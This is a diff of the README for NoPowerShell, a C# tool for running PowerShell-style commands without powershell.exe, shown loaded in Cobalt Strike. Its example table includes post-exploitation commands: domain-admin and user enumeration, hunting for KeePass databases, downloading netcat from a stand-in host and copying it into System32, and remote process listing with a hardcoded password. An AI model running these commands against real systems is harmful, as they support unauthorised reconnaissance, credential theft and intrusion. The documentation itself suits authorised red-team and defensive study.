@@ -4,12 +4,10 @@ NoPowerShell is a tool implemented in C# which supports executing PowerShell-lik
 Moreover, this project makes it easy for everyone to extend its functionality using only a few lines of C# code.
 
 # Screenshots
-## Currently supported commands
-Running in Cobalt Strike.
+## Running in Cobalt Strike
 ![NoPowerShell supported commands](https://raw.githubusercontent.com/bitsadmin/nopowershell/master/Pictures/CurrentlySupportedCommands.png "NoPowerShell in Cobalt Strike")
-## Sample commands
+## Sample execution of commands
 ![NoPowerShell sample commands](https://raw.githubusercontent.com/bitsadmin/nopowershell/master/Pictures/SampleCommands.png "NoPowerShell in Cobalt Strike")
-
 
 # Usage
 ## Note
@@ -21,17 +19,55 @@ When using NoPowerShell from cmd.exe or PowerShell, you need to escape the pipe 
 ## Examples
 | Action | Command | Notes |
 | - | - | - |
-| List help | `NoPowerShell.exe` | Alternative: `NoPowerShell.exe Get-Command` |
-| View status of a service   | `NoPowerShell.exe Get-WmiObject -Class Win32_Service -Filter "Name = 'WinRM'"` | |
-| Search for KeePass database in C:\Users folder | `NoPowerShell.exe gci C:\Users\ -Force -Recurse -Include *.kdbx \| select Directory,Name,Length` | |
-| View system information | `NoPowerShell.exe systeminfo` | |
-| List processes on the system | `NoPowerShell.exe Get-Process` | |
+| List all commands supported by NoPowerShell | `Get-Command` | |
+| Get help for a command | `Get-Help -Name Get-Process` | Alternative: `man ps` |
 | Show current user | `NoPowerShell.exe whoami` | Unofficial command |
-| List autoruns | `NoPowerShell.exe Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run` | |
-| List network shares connected to from this machine | `NoPowerShell.exe Get-NetSmbMapping` | |
-| Download file | `NoPowerShell.exe wget http://myserver.me/nc.exe` | When compiled using .NET 2 only supports SSL up to SSLv3 (no TLS 1.1+) |
-| List PowerShell processes on remote system | `NoPowerShell.exe gwmi "Select ProcessId,Name,CommandLine From Win32_Process" -ComputerName dc1.corp.local \| ? Name -Like "powershell*" \| select ProcessId,CommandLine` | Explicit credentials can be specified using the `-Username` and `-Password` parameters |
-| Execute program using WMI | `NoPowerShell.exe Invoke-WmiMethod -Class Win32_Process -Name Create "cmd /c calc.exe"` | |
+| List all user groups in domain | `Get-ADGroup -Filter *` | |
+| List all administrative groups in domain | `Get-ADGroup -LDAPFilter "(admincount=1)" \| select Name` | |
+| List all properties of the Administrator domain user | `Get-ADUser -Identity Administrator -Properties *` | |
+| List all Administrative users in domain | `Get-ADUser -LDAPFilter "(admincount=1)"` | |
+| List all users in domain | `Get-ADUser -Filter *` | |
+| List specific attributes of user | `Get-ADUser Administrator -Properties SamAccountName,ObjectSID` | |
+| Show information about the current system | `systeminfo` | Unofficial command |
+| List all processes containing PowerShell in the process name | `Get-Process \| ? Name -Like *PowerShell*` | |
+| List all active local users | `Get-LocalUser \| ? Disabled -EQ False` | |
+| List all local groups | `Get-LocalGroup` | |
+| List details of a specific group | `Get-LocalGroup Administrators` | |
+| List all active members of the Administrators group | `Get-LocalGroupMember -Group Administrators \| ? Disabled -eq False` | |
+| List all local users | `Get-LocalUser` | |
+| List details of a specific user | `Get-LocalUser Administrator` | |
+| Copy file from one location to another | `copy C:\Tmp\nc.exe C:\Windows\System32\nc.exe` | |
+| Copy folder | `copy C:\Tmp\MyFolder C:\Tmp\MyFolderBackup` | |
+| Locate KeePass files in the C:\Users\ directory | `ls -Recurse -Force C:\Users\ -Include *.kdbx` | |
+| List the keys under the SOFTWARE key in the registry | `ls HKLM:\SOFTWARE` | |
+| View contents of a file | `Get-Content C:\Windows\WindowsUpdate.log` | |
+| List autoruns in the registry | `Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Run \| ft` | |
+| List processes | `Get-Process` | |
+| List processes on remote host | `Get-Process -ComputerName dc01.corp.local -Username Administrator -Password P4ssw0rd!` | |
+| Obtain data of Win32_Process class from a remote system and apply a filter on the output | `gwmi "Select ProcessId,Name,CommandLine From Win32_Process" -ComputerName dc01.corp.local \| ? Name -Like *PowerShell* \| select ProcessId,CommandLine` | Explicit credentials can be specified using the `-Username` and `-Password` parameters |
+| View details about a certain service | `Get-WmiObject -Class Win32_Service -Filter "Name = 'WinRM'"` | |
+| Launch process using WMI | `Invoke-WmiMethod -Class Win32_Process -Name Create "cmd /c calc.exe"` | This can also be done on a remote system |
+| Delete a read-only file | `Remove-Item -Force C:\Tmp\MyFile.txt` | |
+| Recursively delete a folder | `Remove-Item -Recurse C:\Tmp\MyTools\` | |
+| Show all network interfaces | `Get-NetIPAddress -All` | |
+| Show the IP routing table | `Get-NetRoute` | |
+| Send 2 ICMP requests to IP address 1.1.1.1 with half a second of timeout | `Test-NetConnection -Count 2 -Timeout 500 1.1.1.1` | |
+| Perform a traceroute with a timeout of 1 second and a maximum of 20 hops | `Test-NetConnection -TraceRoute -Timeout 1000 -Hops 20 google.com` | |
+| List network shares on the local machine that are exposed to the network | `Get-NetSmbMapping` | |
+| Format output as a list | `Get-LocalUser \| fl` | |
+| Format output as a list showing only specific attributes | `Get-LocalUser \| fl Name,Description` | |
+| Format output as a table | `Get-Process \| ft` | |
+| Format output as a table showing only specific attributes | `Get-Process \| ft ProcessId,Name` | |
+| Download file from the Internet | `wget http://myserver.me/nc.exe` | When compiled using .NET 2 only supports SSL up to SSLv3 (no TLS 1.1+) |
+| Download file from the Internet specifying the destination | `wget http://myserver.me/nc.exe -OutFile C:\Tmp\netcat.exe` | |
+| Count number of results | `Get-Process \| measure` | |
+| Count number of lines in file | `gc C:\Windows\WindowsUpdate.log \| measure` | |
+| Show only the Name in a file listing | `ls C:\ \| select Name` | |
+| Show first 10 results of file listing | `ls C:\Windows\System32 -Include *.exe \| select -First 10 Name,Length` | |
+| List all members of the "Domain Admins" group | `Get-ADGroupMember "Domain Admins"` | |
+| Resolve domain name | `Resolve-DnsName microsoft.com` | Alternative: `host linux.org` |
+| List local shares | `Get-WmiObject -Namespace ROOT\CIMV2 -Query "Select * From Win32_Share Where Name LIKE '%$'"` | Alternative: `gwmi -Class Win32_Share -Filter "Name LIKE '%$'"` |
+| Show network interfaces | `Get-NetIPAddress` | Alternatives: `ipconfig`, `ifconfig` |
 
 ## Install in Cobalt Strike
 1. Copy both NoPowerShell.exe and NoPowerShell.cna to the **scripts** subfolder of Cobalt Strike
@@ -58,7 +94,6 @@ Add your own cmdlets by submitting a pull request.
 Use the TemplateCommand.cs file in the Commands folder to construct new cmdlets. The TemplateCommand cmdlet is hidden from the list of available cmdlets, but can be called in order to understand its workings. This command looks as follows: `Get-TemplateCommand [-MyFlag] -MyInteger [Int32] -MyString [Value]` and is also accessible via alias `gtc`.
 
 ### Example usages
-
 | Action | Command |
 | - | - |
 | Simply run with default values | `gtc` |
@@ -71,41 +106,54 @@ Use the TemplateCommand.cs file in the Commands folder to construct new cmdlets.
 | Command in combination with a couple of data manipulators in the pipe | `gtc "Bye PowerShell" -MyInteger 30 \| ? Attribute2 -Like Line1* \| select Attribute2 \| fl` |
 
 Execute the following steps to implement your own cmdlet:
-1. Create a copy of the **TemplateCommand.cs** file.
+1. Download Visual Studio Community from https://visualstudio.microsoft.com/downloads/
+    * In the installer select the **.NET desktop development** component.
+    * From this component no optional modules are required for developing NoPowerShell modules.
+2. Clone this repository and create a copy of the **TemplateCommand.cs** file.
     * In case you are implementing a native PowerShell command, place it in folder the corresponding to the _Source_ attribute when executing in PowerShell: `Get-Command My-Commandlet`. Example of a native command: `Get-Command Get-Process` -> Source: `Microsoft.PowerShell.Management` -> Place the .cs file in the **Management** subfolder.
     * In case it is a non-native command, place it in the **Additional** folder.
-2. Update the `TemplateCommand` classname and its constructor name.
-3. Update the static **Aliases** variable to the command and aliases you want to use to call this cmdlet. For native PowerShell commands you can lookup the aliases using `Get-Alias | ? ResolvedCommandName -EQ My-Commandlet` to obtain the list of aliases. Always make sure the full command is the first "alias", for example: `Get-Alias | ? ResolvedCommandName -EQ Get-Process` -> Aliases are: `Get-Process`, `gps`, `ps`
-4. Update the static **Synopsis** variable to a small text that describes the command. This will be shown in the help.
-5. Update the arguments supported by the command by adding _StringArguments_, _BoolArguments_ and _IntegerArguments_ to the static **SupportedArguments** variable.
-6. In the Execute function:
+3. Update the `TemplateCommand` classname and its constructor name.
+4. Update the static **Aliases** variable to the command and aliases you want to use to call this cmdlet. For native PowerShell commands you can lookup the aliases using `Get-Alias | ? ResolvedCommandName -EQ My-Commandlet` to obtain the list of aliases. Always make sure the full command is the first "alias", for example: `Get-Alias | ? ResolvedCommandName -EQ Get-Process` -> Aliases are: `Get-Process`, `gps`, `ps`
+5. Update the static **Synopsis** variable to a small text that describes the command. This will be shown in the help.
+6. Update the arguments supported by the command by adding _StringArguments_, _BoolArguments_ and _IntegerArguments_ to the static **SupportedArguments** variable.
+7. In the Execute function:
     1. Fetch the values of the _StringArguments_, _BoolArguments_ and _IntegerArguments_ as shown in the examples;
     2. Based on the parameters provided by the user, perform your actions;
     3. Make sure all results are stored in the `_results` variable.
-7. Remove all of the template sample code and comments from the file to keep the source tidy.
+8. Remove all of the template sample code and comments from the file to keep the source tidy.
 
 # Contributed NoPowerShell cmdlets
 Authors of additional NoPowerShell cmdlets are added to the table below. Moreover, the table lists commands that are requested by the community to add. Together we can develop a powerful NoPowerShell toolkit!
 
-| Cmdlet | Contributed by | GitHub | Twitter |
-| - | - | - | - |
-| Get-ADUser |  |  |  |
-| Get-ADGroupMember |  |  |  |
+| Cmdlet | Contributed by | GitHub | Twitter | Description |
+| - | - | - | - | - |
+| Get-ADTrusts |  |  |  | Unofficial command showing equivalent of `nltest /domain_trusts /all_trusts /v` |
+| Get-QWinsta |  |  |  | Unofficial command showing equivalent of `qwinsta` / `query session` |
+| Invoke-Command |  |  |  |  |
+| Stop-Process |  |  |  |  |
 
 # Included NoPowerShell cmdlets
 | Cmdlet | Category | Notes |
 | - | - | - |
+| Get-ADGroup | ActiveDirectory | |
+| Get-ADGroupMember | ActiveDirectory | |
+| Get-ADUser | ActiveDirectory | |
 | Get-SystemInfo | Additional | Few fields still need to be added to mimick systeminfo.exe |
 | Get-Whoami | Additional | whoami.exe /ALL is not implemented yet |
 | Get-Command | Core | |
+| Get-Help | Core | |
 | Where-Object | Core | |
+| Resolve-DnsName | DnsClient | Very basic implementation |
+| Get-LocalGroup | LocalAccounts | |
+| Get-LocalGroupMember | LocalAccounts | |
+| Get-LocalUser | LocalAccounts | |
 | Copy-Item | Management | |
-| Get-Content | Management | |
-| Get-Process | Management | Quick & dirty implementation |
-| Invoke-WmiMethod | Management | Quick & dirty implementation |
 | Get-ChildItem | Management | |
+| Get-Content | Management | |
 | Get-ItemProperty | Management | |
+| Get-Process | Management | Quick & dirty implementation |
 | Get-WmiObject | Management | |
+| Invoke-WmiMethod | Management | Quick & dirty implementation |
 | Remove-Item | Management | |
 | Get-NetIPAddress | NetTCPIP | |
 | Get-NetRoute | NetTCPIP | |
@@ -114,7 +162,7 @@ Authors of additional NoPowerShell cmdlets are added to the table below. Moreove
 | Format-List | Utility | |
 | Format-Table | Utility | |
 | Invoke-WebRequest | Utility |
+| Measure-Object | Utility |
 | Select-Object | Utility |
-| Resolve-DnsName | DnsClient | Very basic implementation, support for specifying DNS server and query type need to be added |
 
 **Authored by Arris Huijgen (@_bitsadmin - https://github.com/bitsadmin)**
